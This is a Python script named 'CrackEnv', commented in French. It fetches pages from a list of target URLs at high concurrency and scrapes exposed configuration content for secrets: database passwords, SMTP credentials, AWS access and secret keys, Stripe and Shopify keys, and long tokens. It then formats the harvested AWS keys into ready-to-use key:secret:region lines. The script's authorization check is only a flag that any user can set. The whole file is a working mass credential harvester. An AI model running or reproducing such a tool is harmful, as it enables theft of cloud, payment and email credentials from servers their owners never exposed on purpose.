#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
crackenv_no_proxy.py - version SANS proxy, avec formatage final
Usage:
  python crackenv_no_proxy.py targets.txt [--auth] [--concurrency N] [--timeout S] [--retries R]

Description:
  Scanne une liste d'URLs/IP (une par ligne) et tente d'extraire :
   - DB_* (ignore DB_HOST localhost)
   - SMTP / MAIL / EMAIL / JS/JSON smtp objects (très large heuristique)
   - AWS keys (AKIA..., AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
   - Stripe keys (STRIPE_*)
   - Shopify keys (SHOPIFY_API_KEY / SHOPIFY_API_SECRET / SHOPIFY_API_SCOPES)
  Sauvegarde les résultats dans results_scan_envs/
  Génère ensuite des fichiers formatés :
   - results_scan_envs/database/db_formatted.txt
   - results_scan_envs/aws/aws_formatted.txt
   - results_scan_envs/smtp/smtp_grouped.txt

Important:
  N'exécute ce script que si tu as l'autorisation explicite du propriétaire des cibles.
"""

import asyncio
import aiohttp
import argparse
import re
import sys
import os
import random
from pathlib import Path
from aiohttp import ClientTimeout, TCPConnector
from urllib.parse import urlparse
from collections import defaultdict

# ===========================
# CONFIG DEFAULTS
# ===========================
I_AM_AUTHORIZED = False   # change manuellement only if you really intend to
DEFAULT_CONCURRENCY = 200
DEFAULT_TIMEOUT = 15
DEFAULT_RETRIES = 2
CONTEXT_LINES = 15
OUTPUT_DIR = Path("results_scan_envs")
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) CrackEnv/1.2"
SSL_VERIFY = False  # set True to verify TLS certs
# ===========================

# ------------- regex patterns -------------
DB_FULL_RE = re.compile(
    r'(?P<key>(DB_HOST|DB_PORT|DB_DATABASE|DB_NAME|DB_USERNAME|DB_USER|DB_PASSWORD))\s*[:=]\s*(?P<val>.+)',
    re.IGNORECASE
)
SMTP_ENV_RE = re.compile(
    r'(?P<key>(SMTP_[A-Z0-9_]+|MAIL_[A-Z0-9_]+|EMAIL_[A-Z0-9_]+|MAIL[A-Z0-9_]*))\s*[:=]\s*(?P<val>.+)',
    re.IGNORECASE
)
AWS_RE = re.compile(r'(?P<key>(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_DEFAULT_REGION|AWS_ACCESS_KEY|AWS_SECRET_KEY))\s*[:=]\s*(?P<val>.+)', re.IGNORECASE)
STRIPE_RE = re.compile(r'(?P<key>(STRIPE_KEY|STRIPE_SECRET|STRIPE_API_KEY|STRIPE_PUBLISHABLE_KEY))\s*[:=]\s*(?P<val>.+)', re.IGNORECASE)
SHOPIFY_RE = re.compile(r'(?P<key>(SHOPIFY_API_KEY|SHOPIFY_API_SECRET|SHOPIFY_API_SCOPES))\s*[:=]\s*(?P<val>.+)', re.IGNORECASE)

ENV_KV_RE = re.compile(r'(?P<key>[A-Z0-9_\-\.]{3,60})\s*[:=]\s*(?P<val>(".*?"|\'.*?\'|\$\{.*?\}|[^#\n\r]+))', re.IGNORECASE)

AKIA_RE = re.compile(r'AKIA[0-9A-Z]{16}')
EMAIL_RE = re.compile(r'[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}')
TOKEN_RE = re.compile(r'([A-Za-z0-9_\-]{20,})')

JSON_SMTP_RE = re.compile(r'("smtp"\s*:\s*\{[^}]{0,1200}\})', re.IGNORECASE | re.DOTALL)
JS_SMTP_OBJ_RE = re.compile(r'(smtp\s*[:=]\s*\{[^}]{0,1200}\})', re.IGNORECASE | re.DOTALL)
JS_INLINE_RE = re.compile(r'(?P<key>(smtpHost|smtp_host|smtpUser|smtpUserName|smtpPassword|smtpPass|mailHost|mail_host|mailUser|mail_pass|emailHost|emailUser|emailPass))\s*[:=]\s*(?P<val>(".*?"|\'.*?\'|[^;,\n\r]+))', re.IGNORECASE)
HOST_HINT_RE = re.compile(r'(smtp|mail|email|sendgrid|postmark|mailgun|smtp2go|office365|gmail|amazonaws|ses|smtp\.gmail)', re.IGNORECASE)

# ===========================
# OUTPUT PATHS
# ===========================
db_dir = OUTPUT_DIR / "database"
smtp_dir = OUTPUT_DIR / "smtp"
aws_dir = OUTPUT_DIR / "aws"
stripe_dir = OUTPUT_DIR / "stripe"
shopify_dir = OUTPUT_DIR / "shopify"

for d in (OUTPUT_DIR, db_dir, smtp_dir, aws_dir, stripe_dir, shopify_dir):
    d.mkdir(parents=True, exist_ok=True)

found_urls_path = OUTPUT_DIR / "found_urls.txt"
db_path = db_dir / "db.txt"
smtp_path = smtp_dir / "smtp.txt"
smtp_full_path = smtp_dir / "smtp_full.txt"
aws_path = aws_dir / "aws.txt"
stripe_path = stripe_dir / "stripe.txt"
shopify_path = shopify_dir / "shopify.txt"
possible_tokens_path = OUTPUT_DIR / "possible_tokens.txt"

# ---------------- helpers ----------------
def append(path: Path, line: str):
    with path.open("a", encoding="utf-8", errors="ignore") as f:
        f.write(line.rstrip() + "\n")

def clean_val(v: str) -> str:
    v = v.strip()
    if (v.startswith('"') and v.endswith('"')) or (v.startswith("'") and v.endswith("'")):
        v = v[1:-1]
    v = v.rstrip(",")
    return v.strip()

def get_safe_name_from_url(url: str) -> str:
    p = urlparse(url)
    netloc = p.netloc.replace(":", "_").replace("/", "_")
    path = p.path.replace("/", "_").strip("_")
    if path:
        return f"{netloc}_{path}"
    return netloc

def get_context(lines, idx, ctx=CONTEXT_LINES):
    s = max(0, idx - ctx)
    e = min(len(lines), idx + ctx + 1)
    return "\n".join(lines[s:e])

# ------------- extraction logic -------------
def process_content(url: str, content: str):
    found_any = False
    lines = content.splitlines()
    # line-by-line env-like scan
    for i, raw in enumerate(lines):
        line = raw.strip()
        if not line or line.startswith("#") or line.lower().startswith("<!--"):
            continue

        # DB detection
        mdb = DB_FULL_RE.search(line)
        if mdb:
            key = mdb.group("key").upper()
            val = clean_val(mdb.group("val"))
            if key == "DB_HOST" and val.lower() in ("localhost", "127.0.0.1"):
                continue
            append(db_path, f"{url} | {key} = {val}")
            found_any = True

        # SMTP / MAIL / EMAIL env-like detection
        ms = SMTP_ENV_RE.search(line)
        if ms:
            key = ms.group("key").upper()
            val = clean_val(ms.group("val"))
            append(smtp_path, f"{url} | {key} = {val}")
            ctx = get_context(lines, i)
            append(smtp_full_path, f"--- {url} | {key} = {val} ---")
            append(smtp_full_path, ctx)
            append(smtp_full_path, "")
            found_any = True

        # AWS detection
        ma = AWS_RE.search(line)
        if ma:
            key = ma.group("key").upper()
            val = clean_val(ma.group("val"))
            append(aws_path, f"{url} | {key} = {val}")
            found_any = True

        # Stripe detection
        ms2 = STRIPE_RE.search(line)
        if ms2:
            key = ms2.group("key").upper()
            val = clean_val(ms2.group("val"))
            append(stripe_path, f"{url} | {key} = {val}")
            found_any = True

        # Shopify detection
        ms3 = SHOPIFY_RE.search(line)
        if ms3:
            key = ms3.group("key").upper()
            val = clean_val(ms3.group("val"))
            append(shopify_path, f"{url} | {key} = {val}")
            found_any = True

        # generic env-like fallback (to catch unusual smtp names)
        menv = ENV_KV_RE.search(line)
        if menv:
            k = menv.group("key").upper()
            v = clean_val(menv.group("val"))
            if ("SMTP" in k) or ("MAIL" in k) or ("EMAIL" in k) or HOST_HINT_RE.search(k):
                append(smtp_path, f"{url} | {k} = {v}")
                ctx = get_context(lines, i)
                append(smtp_full_path, f"--- {url} | {k} = {v} ---")
                append(smtp_full_path, ctx)
                append(smtp_full_path, "")
                found_any = True
            if AKIA_RE.search(line):
                ak = AKIA_RE.search(line).group(0)
                append(aws_path, f"{url} | POSSIBLE_AWS_ACCESS_KEY = {ak}")
                found_any = True
            em = EMAIL_RE.search(line)
            if em and ("pass" in line.lower() or "pwd" in line.lower() or "password" in line.lower() or "mail" in line.lower()):
                append(smtp_path, f"{url} | POSSIBLE_EMAIL_IN_LINE = {em.group(0)}")
                ctx = get_context(lines, i)
                append(smtp_full_path, f"--- {url} | POSSIBLE_EMAIL_IN_LINE = {em.group(0)} ---")
                append(smtp_full_path, ctx)
                append(smtp_full_path, "")
                found_any = True

    # JSON-style objects
    for m in JSON_SMTP_RE.finditer(content):
        snippet = m.group(1)
        for ksearch in re.finditer(r'("?(host|hostname|user|username|pass|password|port|secure|encryption|auth)"?\s*:\s*(".*?"|\'.*?\'|[^,}\n]+))', snippet, re.IGNORECASE):
            kk = ksearch.group(2)
            vv = clean_val(ksearch.group(3))
            append(smtp_path, f"{url} | JSON_{kk.upper()} = {vv}")
            append(smtp_full_path, f"--- {url} | JSON_{kk.upper()} = {vv} ---")
            append(smtp_full_path, snippet)
            append(smtp_full_path, "")
            found_any = True

    # JS object style
    for m in JS_SMTP_OBJ_RE.finditer(content):
        snippet = m.group(0)
        for ksearch in re.finditer(r'([A-Za-z0-9_"\'\-\$]*?(host|hostname|user|username|pass|password|port|secure|encryption|auth)[A-Za-z0-9_"\'\-\$]*?)\s*[:=]\s*(".*?"|\'.*?\'|[^,}\n]+)', snippet, re.IGNORECASE):
            kk = ksearch.group(1)
            vv = clean_val(ksearch.group(3))
            append(smtp_path, f"{url} | JSOBJ_{kk} = {vv}")
            append(smtp_full_path, f"--- {url} | JSOBJ_{kk} = {vv} ---")
            append(smtp_full_path, snippet)
            append(smtp_full_path, "")
            found_any = True

    if AKIA_RE.search(content):
        ak = AKIA_RE.search(content).group(0)
        append(aws_path, f"{url} | POSSIBLE_AWS_ACCESS_KEY = {ak}")
        found_any = True

    for tok in TOKEN_RE.findall(content):
        if len(tok) >= 30:
            append(possible_tokens_path, f"{url} | {tok}")
            found_any = True

    return found_any

# ------------- networking / worker -------------
async def fetch(session: aiohttp.ClientSession, url: str, timeout=DEFAULT_TIMEOUT, retries=DEFAULT_RETRIES):
    attempt = 0
    backoff = 1.0
    while attempt <= retries:
        try:
            async with session.get(url, timeout=ClientTimeout(total=timeout), allow_redirects=True) as resp:
                text = await resp.text(errors="ignore")
                return resp.status, text
        except Exception:
            attempt += 1
            if attempt > retries:
                return None, None
            await asyncio.sleep(backoff + random.random() * 0.5)
            backoff *= 2
    return None, None

async def worker(name, queue: asyncio.Queue, session: aiohttp.ClientSession, timeout, retries):
    while True:
        url = await queue.get()
        if url is None:
            queue.task_done()
            return
        status, text = await fetch(session, url, timeout=timeout, retries=retries)
        if status and text and status == 200:
            lower = text.lower()
            if any(tok in lower for tok in ("db_password","db_username","aws_access_key_id","smtp","mail_host","stripe","shopify_api_key","mail_username","mail_password","mail_port","mail_encryption","mail_host")):
                append(found_urls_path, f"{url} -> 200")
                processed = process_content(url, text)
                if processed:
                    safe_name = get_safe_name_from_url(url)
                    raw_path = OUTPUT_DIR / f"raw_{safe_name}.txt"
                    with raw_path.open("w", encoding="utf-8", errors="ignore") as f:
                        f.write(text)
        queue.task_done()

# ------------- formatting helpers -------------
def format_db_grouped():
    input_db = db_path
    output_db = db_dir / "db_formatted.txt"
    if not input_db.exists():
        return
    grouped = defaultdict(list)
    with input_db.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or "|" not in line:
                continue
            parts = line.split("|", 1)
            url = parts[0].strip()
            kv = parts[1].strip()
            grouped[url].append(kv)
    with output_db.open("w", encoding="utf-8") as out:
        for url, entries in grouped.items():
            out.write(f"{url}\n\n")
            # try to order keys in sensible order
            order = ["DB_HOST","DB_PORT","DB_DATABASE","DB_NAME","DB_USERNAME","DB_USER","DB_PASSWORD"]
            seen = set()
            for k in order:
                for e in entries:
                    if e.upper().startswith(k):
                        out.write(f"{e}\n")
                        seen.add(e)
            # rest
            for e in sorted(entries):
                if e not in seen:
                    out.write(f"{e}\n")
            out.write("\n" + "-" * 78 + "\n\n")

def format_aws_compact():
    input_aws = aws_path
    output_aws = aws_dir / "aws_formatted.txt"
    if not input_aws.exists():
        return
    content = input_aws.read_text(encoding="utf-8", errors="ignore")
    # split by URL blocks when possible (lines starting with "http")
    lines = [l.strip() for l in content.splitlines() if l.strip()]
    grouped = defaultdict(dict)
    current_url = None
    for line in lines:
        if "|" in line:
            parts = line.split("|", 1)
            maybe_url = parts[0].strip()
            rest = parts[1].strip()
            # detect if first part looks like a URL
            if maybe_url.lower().startswith("http://") or maybe_url.lower().startswith("https://"):
                current_url = maybe_url
            else:
                # fallback: keep current_url
                pass
            # parse key = val
            if "=" in rest:
                k, v = rest.split("=",1)
                k = k.strip().upper()
                v = v.strip()
                if current_url:
                    grouped[current_url][k] = v
    # Now attempt to produce AKIA:SECRET:REGION lines
    out_lines = []
    for url, kv in grouped.items():
        ak = kv.get("AWS_ACCESS_KEY_ID") or kv.get("AWS_ACCESS_KEY")
        secret = kv.get("AWS_SECRET_ACCESS_KEY") or kv.get("AWS_SECRET_KEY")
        region = kv.get("AWS_DEFAULT_REGION")
        if ak and secret and region:
            out_lines.append(f"{ak}:{secret}:{region}")
        else:
            # try to find AKIA in any value in original file (fallback)
            # search in content block around url
            # (simple fallback: skip if incomplete)
            pass
    if out_lines:
        output_aws.write_text("\n".join(out_lines), encoding="utf-8")
    else:
        # If nothing assembled, write a small note
        output_aws.write_text("", encoding="utf-8")

def format_smtp_grouped():
    input_smtp = smtp_path
    output_smtp = smtp_dir / "smtp_grouped.txt"
    if not input_smtp.exists():
        return
    grouped = defaultdict(list)
    with input_smtp.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or "|" not in line:
                continue
            parts = line.split("|",1)
            url = parts[0].strip()
            kv = parts[1].strip()
            grouped[url].append(kv)
    with output_smtp.open("w", encoding="utf-8") as out:
        for url, entries in grouped.items():
            out.write(f"{url}\n\n")
            # prefer ordering common smtp keys
            order = ["SMTP_HOST","MAIL_HOST","SMTP_PORT","MAIL_PORT","SMTP_USERNAME","MAIL_USERNAME","SMTP_PASSWORD","MAIL_PASSWORD","MAIL_ENCRYPTION","MAIL_DRIVER","MAIL_MAILER","MAIL_FROM_ADDRESS","MAIL_FROM_NAME"]
            seen = set()
            for k in order:
                for e in entries:
                    if e.upper().startswith(k):
                        out.write(f"{e}\n")
                        seen.add(e)
            for e in sorted(entries):
                if e not in seen:
                    out.write(f"{e}\n")
            out.write("\n" + "-" * 78 + "\n\n")

# ------------- main runner -------------
async def run_scan(targets_file: Path, concurrency: int, timeout: int, retries: int):
    cli_auth = "--auth" in sys.argv
    env_auth = os.getenv("AUTH", "") in ("1","true","True","yes","YES")
    if not (I_AM_AUTHORIZED or cli_auth or env_auth):
        print("ERROR: I_AM_AUTHORIZED is False. Use one of:")
        print(" - edit the script and set I_AM_AUTHORIZED = True  (quick)")
        print(" - run with --auth : python crackenv_no_proxy.py targets.txt --auth")
        print(" - set env var AUTH=1 and run the script")
        return

    with targets_file.open("r", encoding="utf-8", errors="ignore") as f:
        raw = [l.strip() for l in f if l.strip()]

    targets = []
    for line in raw:
        l = line
        if not l.lower().startswith(("http://","https://")):
            l = "https://" + l
        targets.append(l)

    conn = TCPConnector(ssl=SSL_VERIFY, limit=concurrency, ttl_dns_cache=300)
    headers = {"User-Agent": USER_AGENT}
    queue = asyncio.Queue()
    for t in targets:
        await queue.put(t)

    async with aiohttp.ClientSession(timeout=ClientTimeout(total=timeout), connector=conn, headers=headers) as session:
        workers = []
        n_workers = min(concurrency, max(2, len(targets)))
        for i in range(n_workers):
            w = asyncio.create_task(worker(f"w{i}", queue, session, timeout, retries))
            workers.append(w)

        await queue.join()
        for _ in workers:
            await queue.put(None)
        await asyncio.gather(*workers, return_exceptions=True)

    print("Scan terminé. Résultats dans :", OUTPUT_DIR.resolve())
    print(" - DB   :", db_path.resolve())
    print(" - SMTP :", smtp_path.resolve())
    print(" - SMTP full (ctx):", smtp_full_path.resolve())
    print(" - AWS  :", aws_path.resolve())
    print(" - STRIPE:", stripe_path.resolve())
    print(" - SHOPIFY:", shopify_path.resolve())
    print(" - Raw files in", OUTPUT_DIR.resolve())

    # Post-process / format outputs
    try:
        format_db_grouped()
        format_aws_compact()
        format_smtp_grouped()
        print("Fichiers formatés générés :")
        print(" -", (db_dir / "db_formatted.txt").resolve())
        print(" -", (aws_dir / "aws_formatted.txt").resolve())
        print(" -", (smtp_dir / "smtp_grouped.txt").resolve())
    except Exception as e:
        print("Erreur lors du formatage :", e)

def parse_args():
    ap = argparse.ArgumentParser(description="CrackEnv (no proxy, formatted outputs)")
    ap.add_argument("targets", help="fichier targets.txt (une url/ip par ligne)")
    ap.add_argument("--auth", action="store_true", help="Autorise l'exécution (alternative à AUTH=1 ou I_AM_AUTHORIZED)")
    ap.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY, help="Nombre de workers concurrents")
    ap.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Timeout total par requête (s)")
    ap.add_argument("--retries", type=int, default=DEFAULT_RETRIES, help="Nombre de retries réseau")
    return ap.parse_args()

def main():
    args = parse_args()
    targets_file = Path(args.targets)
    if not targets_file.exists():
        print("Fichier introuvable:", targets_file)
        sys.exit(1)
    if args.auth:
        os.environ["AUTH"] = "1"
    asyncio.run(run_scan(targets_file, args.concurrency, args.timeout, args.retries))

if __name__ == "__main__":
    main()
